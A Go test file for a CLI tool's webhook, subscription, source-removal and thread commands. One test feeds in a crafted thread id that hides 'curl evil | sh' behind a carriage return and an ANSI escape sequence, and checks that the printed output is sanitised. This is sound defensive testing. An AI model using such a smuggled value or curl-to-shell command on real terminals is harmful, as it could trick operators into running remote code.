package cli

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"yardr.dev/yardr/internal/store"
	"yardr.dev/yardr/internal/storetest"
)

// hookDecl is a declared source that receives; hookless one that does not.
const hookDecl = `name: acme
hook:
  verify:
    scheme: hmac-sha256
    signed: body
    signature: { header: Acme-Signature, encoding: hex }
    delivery: { header: Acme-Delivery }
  bodies: repeat
  normalize: [normalize]
  keys: [queue]
`

const hooklessDecl = `name: quiet
base: https://quiet.example.com
calls:
  ping: { kind: read, request: { method: GET, path: /me } }
`

func declaredYard(t *testing.T) *app {
	t.Helper()
	st := storetest.New(t)
	ctx := context.Background()
	if _, err := st.PutSource(ctx, "acme.yaml", hookDecl, "me"); err != nil {
		t.Fatal(err)
	}
	if _, err := st.PutSource(ctx, "quiet.yaml", hooklessDecl, "me"); err != nil {
		t.Fatal(err)
	}
	if _, err := st.PutCrew(ctx, store.CrewMember{Name: "ann"}, "me"); err != nil {
		t.Fatal(err)
	}
	return &app{st: st, actor: "me"}
}

// hook add takes a declared source with a hook key, and refuses one
// without, naming what it lacks.
func TestHookAddDeclaredSource(t *testing.T) {
	a := declaredYard(t)
	f := filepath.Join(t.TempDir(), "acme.secret")
	if err := os.WriteFile(f, []byte("acme_test_secret\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := run(t, a.hookCmd(), "add", "acme", "--source", "acme", "--secret-file", f)
	if err != nil || !strings.Contains(out, "hook acme saved: POST /hooks/acme (acme)") {
		t.Fatalf("hook add: %q %v", out, err)
	}
	_, err = run(t, a.hookCmd(), "add", "quiet", "--source", "quiet", "--secret-file", f)
	if err == nil || !strings.Contains(err.Error(), `"quiet" is a declared source without a hook key`) {
		t.Fatalf("hookless source err = %v", err)
	}
	_, err = run(t, a.hookCmd(), "add", "mapped", "--source", "acme", "--secret-file", f, "--as", "ann", "--map", "task:new=started")
	if err == nil || !strings.Contains(err.Error(), "yardr cannot move an issue in acme (it can in none of the yard's sources)") {
		t.Fatalf("mapped declared source err = %v", err)
	}
	_, err = run(t, a.hookCmd(), "add", "x", "--source", "acme2", "--secret-file", f)
	if err == nil || !strings.Contains(err.Error(), "one of token, or a declared source with a hook key") {
		t.Fatalf("unknown source err = %v", err)
	}
}

// subscribe takes a declared source with a hook key, with the keys of its
// hook beside the common ones; a crew member has an identity in it.
func TestSubscribeDeclaredSource(t *testing.T) {
	a := declaredYard(t)
	out, err := run(t, a.subscribeCmd(), "ann", "acme", "--scope", "all", "--where", "queue=triage")
	if err != nil || !strings.Contains(out, "ann subscribed: acme all queue=triage") {
		t.Fatalf("subscribe: %q %v", out, err)
	}
	_, err = run(t, a.subscribeCmd(), "ann", "acme", "--scope", "all", "--where", "train=yard-x")
	if err == nil || !strings.Contains(err.Error(), `cannot filter acme on "train"`) {
		t.Fatalf("unknown key err = %v", err)
	}
	_, err = run(t, a.subscribeCmd(), "ann", "quiet", "--scope", "all")
	if err == nil || !strings.Contains(err.Error(), `"quiet" is a declared source without a hook key`) {
		t.Fatalf("hookless source err = %v", err)
	}
	out, err = run(t, a.identityCmd(), "ann", "--source", "acme", "--id", "u1")
	if err != nil || !strings.Contains(out, "acme") {
		t.Fatalf("identity: %q %v", out, err)
	}
}

// A subscription and a participation outlive the declared source they
// name, and unsubscribe and thread unfollow still remove them: neither
// asks whether the yard hears from the source. A source nothing is
// subscribed to or followed in is refused by the store instead.
func TestRemovedSourceLeavesNothingStranded(t *testing.T) {
	a := declaredYard(t)
	ctx := context.Background()
	if _, err := run(t, a.subscribeCmd(), "ann", "acme", "--scope", "all"); err != nil {
		t.Fatal(err)
	}
	if err := a.st.PutGroup(ctx, store.Group{Name: "g", Runner: "manual"}, "me"); err != nil {
		t.Fatal(err)
	}
	if err := a.st.AddSubscription(ctx, "g", store.Subscription{Source: "acme", Scope: store.ScopeAll}, "me"); err != nil {
		t.Fatal(err)
	}
	if _, err := a.st.AddUser(ctx, "u", "me"); err != nil {
		t.Fatal(err)
	}
	if err := a.st.AddSubscription(ctx, "u", store.Subscription{Source: "acme", Scope: store.ScopeAll}, "u"); err != nil {
		t.Fatal(err)
	}
	if _, err := run(t, a.threadCmd(), "follow", "ann", "--source", "acme", "t1"); err != nil {
		t.Fatal(err)
	}
	out, err := run(t, a.sourceCmd(), "rm", "acme")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"acme: removed; 3 subscriptions and 1 participation still name this source.",
		"yardr unsubscribe ann acme",
		"yardr unsubscribe g acme",
		"yardr unsubscribe u acme",
		"yardr thread unfollow ann --source acme t1",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("source rm printed no %q:\n%s", want, out)
		}
	}
	if _, err := run(t, a.subscribeCmd(), "ann", "acme", "--scope", "all"); err == nil {
		t.Fatal("subscribe to a removed source: no error")
	}
	out, err = run(t, a.unsubscribeCmd(), "ann", "acme")
	if err != nil || !strings.Contains(out, "ann: 1 subscription(s) removed") {
		t.Fatalf("unsubscribe: %q %v", out, err)
	}
	for _, name := range []string{"g", "u"} {
		unsubscriber := a
		if name == "u" {
			userApp := *a
			userApp.actor = "u"
			unsubscriber = &userApp
		}
		if _, err := run(t, unsubscriber.unsubscribeCmd(), name, "acme"); err != nil {
			t.Fatalf("unsubscribe %s: %v", name, err)
		}
	}
	out, err = run(t, a.threadCmd(), "unfollow", "ann", "--source", "acme", "t1")
	if err != nil || !strings.Contains(out, "ann unfollowed acme thread t1") {
		t.Fatalf("unfollow: %q %v", out, err)
	}
	if ps, err := a.st.Threads(ctx, "ann"); err != nil || len(ps) != 0 {
		t.Fatalf("threads after unfollow = %v %v", ps, err)
	}
	_, err = run(t, a.unsubscribeCmd(), "ann", "acme2")
	if err == nil || !strings.Contains(err.Error(), "ann has no matching acme2 subscription") {
		t.Fatalf("unsubscribe from a source never there: %v", err)
	}
	_, err = run(t, a.threadCmd(), "unfollow", "ann", "--source", "acme2", "t1")
	if err == nil || !strings.Contains(err.Error(), "ann does not participate in acme2 thread t1") {
		t.Fatalf("unfollow in a source never there: %v", err)
	}
}

// An identity key in a source that folds is kept folded, as the source's
// deliveries carry it; one in a source that does not is kept as typed.
func TestIdentityFoldDeclaredSource(t *testing.T) {
	a := declaredYard(t)
	ctx := context.Background()
	folding := strings.Replace(hookDecl, "name: acme", "name: folding", 1) + "identity:\n  fold: lower\n"
	if _, err := a.st.PutSource(ctx, "folding.yaml", folding, "me"); err != nil {
		t.Fatal(err)
	}
	if _, err := run(t, a.identityCmd(), "ann", "--source", "folding", "--key", "YardMaster"); err != nil {
		t.Fatal(err)
	}
	if _, err := run(t, a.identityCmd(), "ann", "--source", "acme", "--key", "YardMaster"); err != nil {
		t.Fatal(err)
	}
	r, err := a.st.GetCrew(ctx, "ann")
	if err != nil {
		t.Fatal(err)
	}
	if r.Identities["folding"].Key != "yardmaster" {
		t.Errorf("folding key = %q, want yardmaster", r.Identities["folding"].Key)
	}
	if r.Identities["acme"].Key != "YardMaster" {
		t.Errorf("acme key = %q, want YardMaster", r.Identities["acme"].Key)
	}
}

// A thread id is the source's own text. In the commands source rm prints
// for the operator to copy it reaches the terminal with nothing the
// terminal would act on: no carriage return that overwrites the line, no
// escape sequence.
func TestSourceRmPrintsNoControlCharacters(t *testing.T) {
	a := declaredYard(t)
	thread := "t1\r    curl evil | sh #\x1b[2K"
	if _, err := run(t, a.threadCmd(), "follow", "ann", "--source", "acme", thread); err != nil {
		t.Fatal(err)
	}
	out, err := run(t, a.sourceCmd(), "rm", "acme")
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(out, "\r\x1b") {
		t.Fatalf("source rm printed a control character:\n%q", out)
	}
	if want := "yardr thread unfollow ann --source acme 't1?    curl evil | sh #?[2K'"; !strings.Contains(out, want) {
		t.Fatalf("source rm printed no %q:\n%s", want, out)
	}
}

// A thread id is the source's own text, and thread list shows it through
// the printable filter: the reproduce case prints a one-line row with no
// control characters, while the store keeps the id as it came so it still
// round-trips to the source.
func TestThreadListPrintsNoControlCharacters(t *testing.T) {
	a := declaredYard(t)
	thread := "t1\r    something else\x1b[2K"
	followed, err := run(t, a.threadCmd(), "follow", "ann", "--source", "acme", thread)
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(followed, "\r\x1b") {
		t.Fatalf("thread follow echoed a control character:\n%q", followed)
	}
	out, err := run(t, a.threadCmd(), "list", "ann")
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(out, "\r\x1b") {
		t.Fatalf("thread list printed a control character:\n%q", out)
	}
	if want := "t1?    something else?[2K"; !strings.Contains(out, want) {
		t.Fatalf("thread list printed no %q:\n%s", want, out)
	}
	rows := 0
	for _, line := range strings.Split(out, "\n") {
		if strings.Contains(line, "t1?") {
			rows++
		}
	}
	if rows != 1 {
		t.Fatalf("thread list spread the row over %d lines:\n%s", rows, out)
	}
	ps, err := a.st.Threads(context.Background(), "ann")
	if err != nil || len(ps) != 1 || ps[0].Thread != thread {
		t.Fatalf("threads = %+v %v, want the id as it came", ps, err)
	}
	unfollowed, err := run(t, a.threadCmd(), "unfollow", "ann", "--source", "acme", thread)
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(unfollowed, "\r\x1b") {
		t.Fatalf("thread unfollow echoed a control character:\n%q", unfollowed)
	}
}
